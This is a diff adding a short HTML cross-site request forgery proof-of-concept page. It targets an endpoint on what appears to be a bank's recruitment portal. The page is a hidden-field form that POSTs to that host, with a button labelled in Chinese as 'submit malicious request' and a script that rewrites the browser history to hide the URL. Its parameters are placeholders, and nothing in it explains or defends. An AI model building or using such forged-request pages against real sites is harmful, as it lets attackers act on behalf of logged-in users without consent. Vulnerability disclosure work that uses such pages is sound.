@@ -1,0 +1,18 @@
+  <!doctype html>
+  <html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF PoC Demo</title>
+  </head>
+  <body>
+    <form id="csrfForm" method="POST" action="https://zhaopin.shengjingbank.com.cn:8080/servlet/hirelogin/HireCloseBrowse">
+      <input type="hidden" name="param1" value="value1">
+      <input type="hidden" name="param2" value="value2">
+      <button type="submit" id="submitBtn" >提交恶意请求</button>
+    </form>
+
+    <script>
+      history.pushState('', '', '/');
+    </script>
+  </body>
+  </html>
